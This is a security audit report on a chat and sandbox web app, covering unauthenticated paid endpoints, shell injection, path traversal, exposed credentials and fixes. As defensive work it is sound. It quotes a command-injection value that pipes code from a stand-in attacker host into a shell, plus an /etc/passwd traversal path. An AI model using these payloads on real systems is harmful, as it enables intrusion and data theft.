# Security & code audit — ic4pi/Chat

Static review at commit `bb54ccc`, plus `npm audit` and one local run of
`scripts/check-api.mjs`. F-02/03/04/08 were confirmed by reproducing the
specific string-handling or tooling behaviour; the rest are read from code.

Not covered: the live deployment's actual configuration, the Modal GPU apps'
own endpoints, and `sandbox-runner/` (excluded by `.vercelignore`).

**Tally:** 4 critical · 3 high · 5 medium/hygiene · 7 things already right.

**Status:** F-02, F-03, F-04, F-06, F-07, F-08 and F-10 are fixed, F-09 partly on
`claude/app-audit-recommendations-ee634k`, each pinned by a new check in
`scripts/check-api.mjs`. F-01 and F-05 need an access-gate decision and a login
screen; F-11 and F-12 are deferred. A fifth injection — the commit message in
`git-push.js`, missed in the first pass — was found while fixing F-04 and is
fixed with it.

---

## If you read nothing else

1. **Check provider dashboards for unexpected spend today.** Chat, media
   generation and sandbox VM creation are reachable by anyone with the URL.
2. **Stop accepting `ADMIN_PASSWORD` as the paid-model unlock** — that secret is
   cached in every visitor's `localStorage` (F-06).
3. **Three shell-injection / traversal bugs in the sandbox API** (F-02/03/04).

---

## Critical

### F-01 — Every endpoint that spends money is open, with no rate limit

`/api/chat`, `/api/media-generate`, `/api/group-chat`, `/api/generate`,
`/api/agent-chat`, `/api/sandbox/init-blank` and `/api/sandbox/init-repo` take no
credential, and all set `Access-Control-Allow-Origin: *`. A grep for rate
limiting across `api/` and `lib/` returns nothing but a UI label.

Free-model chat has no gate at all. Media generation is gated only on
`?op=credit` (topping up balances) — the generate path itself is wide open.
`init-blank` lets a stranger create Vercel Sandbox microVMs on the account,
45 minutes each.

- `api/media-generate.js:845`, `api/chat.js:274`, `lib/sandbox-api/init-blank.js:102`

**Fix:** Vercel Deployment Protection, or a shared `X-App-Token` header injected
at build time. Then a per-IP token bucket in KV (`lib/kv.js` already exists) in
front of the generate and sandbox-create routes. Narrow CORS to your own origin.

### F-02 — [FIXED] Shell command injection in `/api/file` via `path` (verified)

The query parameter is concatenated into a `bash -c` string inside double
quotes. Bash still expands `$(…)`, backticks and `\` there, so
`?path=x$(curl attacker/s|sh)` runs that command in the sandbox VM.

```js
const abs = `${REPO_DIR}/${relPath}`;
await sandbox.runCommand({ cmd: 'bash',
  args: ['-c', `stat -c %s "${abs}" 2>/dev/null || echo 0`] });
```

- `lib/sandbox-api/file.js:30,39,45`; same pattern at `lib/sandbox-api/search.js:73,156`

**Fix:** pass the path as argv (`cmd: 'stat', args: ['-c','%s', abs]`) instead of
building a shell string. `search.js` already handles keywords correctly with an
allowlist regex — the file-path interpolation on those two lines is the leak.

### F-03 — [FIXED] The path-traversal guard doesn't stop traversal (verified)

Both the file reader and the writer check `abs.startsWith(REPO_DIR + '/')`. That
passes for `/vercel/sandbox/repo/../../etc/passwd` — the prefix is intact, the
escape happens after it. So `?path=../../etc/passwd` reads anything in the VM,
and `write-files` writes anywhere in it.

- `lib/sandbox-api/file.js:33`, `lib/sandbox-api/write-files.js:55`

**Fix:** `path.posix.normalize()` before the `startsWith` check. One shared
helper for both handlers — they've drifted apart once already.

### F-04 — [FIXED] Command injection in `/api/git-push` (verified)

Entries in the `files` array are sanitized for `..` and `"`, then interpolated
into `git add -- "…"` under `bash -c`. Neither `$`, backtick nor `\` is
stripped, so F-02's expansion applies.

This matters more than the others because of timing: the caller's GitHub PAT is
in scope in this request and is written into a remote URL moments later.

```js
const rel = String(p || '').replace(/^\.\//, '').replace(/\.\./g, '');
if (!rel || rel.includes('..')) continue;
const add = await run(sandbox, `git add -- "${rel.replace(/"/g, '')}"`);
```

- `lib/sandbox-api/git-push.js:116-118`

**Fix:** `cmd: 'git', args: ['add','--', rel]`, and normalize as in F-03 rather
than regex-stripping `..`, which is order-dependent.

---

## High

### F-05 — The Supabase service-role key backs six unauthenticated routes

`lib/hub.js` builds its client with `SUPABASE_SERVICE_ROLE_KEY`, bypassing RLS
entirely. The routes gate on `requireHub()`, which only checks that the env vars
exist — a configuration check, not an auth check. Any caller can read, write or
delete any thread, message, topic or nudge.

- `lib/hub.js:11,199`; `api/hub/[route].js:1371`

**Fix:** put the hub routes behind the F-01 gate and scope reads/writes to a
caller identity rather than trusting `fromThreadId` from the body. If the hub
ever serves more than one person, move to the anon key plus RLS policies.

### F-06 — [FIXED] Your admin password can end up in every visitor's `localStorage`

`paidUnlockSecrets()` accepts `PAID_MODELS_PASSWORD`, `ADMIN_PASSWORD`, *and*
`username:password`. The client persists whatever was typed under a
`localStorage` key so the unlock carries between Chat and Workspace, and replays
it as `X-Paid-Password`.

So with `PAID_MODELS_PASSWORD` unset — which the README presents as fine — the
credential that opens `/admin`, where the master prompt and every persona system
prompt live, sits in browser storage on every machine that unlocked a paid model.

- `lib/model-meta.js:38-51`; `sandbox-terminal/src/providerPrefs.ts:42-62`

**Fix:** drop `ADMIN_PASSWORD` and the `user:pass` combo from
`paidUnlockSecrets()`; require a distinct `PAID_MODELS_PASSWORD` and 503 when
unset. Then rotate `ADMIN_PASSWORD`, since it may already be cached.

### F-07 — [FIXED] The cron secret falls open when unset

`if (process.env.CRON_SECRET && req.headers.authorization !== …)` — unset means
the check is skipped. Anyone can then trigger `/api/hub/sweep`, which walks every
thread making LLM calls.

`lib/auth.js` gets this exactly right for `/admin` (503 when unconfigured); the
sweep route contradicts a stance the codebase otherwise holds.

- `api/hub/[route].js:991`

**Fix:** invert it — no `CRON_SECRET` means 503. One line.

---

## Medium & hygiene

### F-08 — [FIXED] Five high-severity `undici` advisories (verified)

Via `@vercel/sandbox`. Response desynchronization through the retry interceptor,
CRLF injection, cross-user disclosure via cache-directive parsing — all relevant
to a codebase whose job is proxying HTTP.

**Fix:** `npm audit fix`, run `npm run check`, commit the lockfile.

### F-09 — [PARTLY FIXED] No security headers; `vercel.json` has no `headers` block

No CSP, `X-Frame-Options` or `Referrer-Policy`. The renderer is XSS-safe today,
but CSP is the backstop for the day someone adds an `innerHTML` to a page that
renders model output — there are already 45 `innerHTML` sites in `public/`.

**Done:** `vercel.json` now sets `X-Content-Type-Options`, `Referrer-Policy`,
`X-Frame-Options`, `Strict-Transport-Security` and `Permissions-Policy`
(`microphone=(self)`, since `public/app.js:4929` uses `SpeechRecognition`).

**Still open — CSP.** Not shipped because the artifact preview at
`public/index.html:525` uses `srcdoc`, and a `srcdoc` iframe inherits the
parent's CSP: any real `script-src` silently blanks every artifact preview.
Fixing that first means pointing the iframe at `/artifact-preview.html` and
posting the HTML in, so that one path can carry its own looser policy —
isolation is unchanged, because `sandbox="allow-scripts"` without
`allow-same-origin` is what provides it, not the URL. Then run the policy as
`Content-Security-Policy-Report-Only` for a week before enforcing.

### F-10 — [FIXED] You wrote a good test gate and nothing runs it

`scripts/check-api.mjs` is 14 real checks (handler-export contracts, provider and
auth interfaces, timeout budgets, function cap, coder-package parity). It passes
in about a second. The only workflow in the repo is a manual Modal deploy, so the
gate only fires when a sandbox agent pushes — the human path is the unguarded one.

**Fix:** a ten-line workflow on `push` and `pull_request`: checkout, setup-node,
`npm ci`, `npm run check`.

### F-11 — Video billing balances race on read-modify-write

`lib/video-billing.js` reads, subtracts and writes back with no lock; concurrent
generations from one key lose a debit. The file documents this and calls it fine
at current scale — a fair call, listed so it isn't forgotten if the group grows.

**Fix (when it matters):** Redis `DECRBY` on an integer-cents key, checking the
returned value for overdraft instead of pre-reading.

### F-12 — Build output and stray files are committed

`sandbox-terminal/tsconfig.{app,node}.tsbuildinfo` are machine-local incremental
caches that conflict on parallel builds. `public/agent/assets/index-*.js` is a
tracked build of tracked source, so the two can silently disagree.
`public/Place` is a one-byte file with no extension and no referent.

Separately, `public/app.js` is 5,980 lines in one non-module file — a fifth of
the codebase and its highest-churn surface. Not a bug, but it will make every fix
above slower.

**Fix:** gitignore `*.tsbuildinfo` and untrack; delete `public/Place`; untrack
the built bundle if Vercel builds it. Split `app.js` along seams as you touch
them, not in one move.

---

## What's already right

Worth stating, because these should survive the refactors above.

| | |
|---|---|
| **No XSS surface in the renderer** | Code fences become `<pre>`; everything else is a text node via `textContent`. `public/app.js:1318` |
| **Artifact iframe correctly sandboxed** | `sandbox="allow-scripts"` without `allow-same-origin` → opaque origin. `public/index.html:525` |
| **Admin auth never falls open** | Constant-time compare, 503 with instructions when unconfigured. `lib/auth.js` |
| **System prompts really stay server-side** | `/api/public-config` exposes IDs and names only. `api/chat.js:34` |
| **Sandbox pushes can't land on main** | `main`/`master` rerouted to `agent/<stamp>` + PR, no override. `lib/sandbox-api/git-push.js:224` |
| **Pre-push gate refuses "no tests → allow"** | Strict default, unusual and correct. `lib/sandbox-api/git-push.js:143` |
| **Truncated output can't overwrite a handler** | Rejects "… existing code …" stubs and API files missing `export default`. `lib/sandbox-api/write-files.js:12-36` |

---

## Suggested order

**Today** — find out what it cost, then close the door
- Read OpenRouter / Venice / Cloudflare / fal.ai / Vercel Sandbox usage for spend you can't account for
- Deployment Protection or a shared header check on the expensive routes (F-01)
- Rotate `ADMIN_PASSWORD`, set a distinct `PAID_MODELS_PASSWORD`, set `CRON_SECRET` (F-06, F-07)

**This week** — the injection bugs and the fall-open gates
- One shared `resolveRepoPath()` (normalize, then prefix-check) used by `file`, `write-files`, `git-push` (F-03)
- Convert every user-derived shell interpolation to argv (F-02, F-04)
- Invert the `CRON_SECRET` check; drop `ADMIN_PASSWORD` from unlock secrets (F-06, F-07)
- `npm audit fix` (F-08)

**Next** — make the gates automatic
- CI running `npm run check` on push and PR (F-10)
- Security headers in `vercel.json` (F-09)
- Per-IP rate limiting in KV (F-01)
- Scope the hub routes to a caller identity (F-05)

**Ongoing** — pay down the size
- Untrack build output, delete `public/Place` (F-12)
- Split `public/app.js` along seams as you touch them
- Atomic `DECRBY` for video balances if the access-key list grows (F-11)
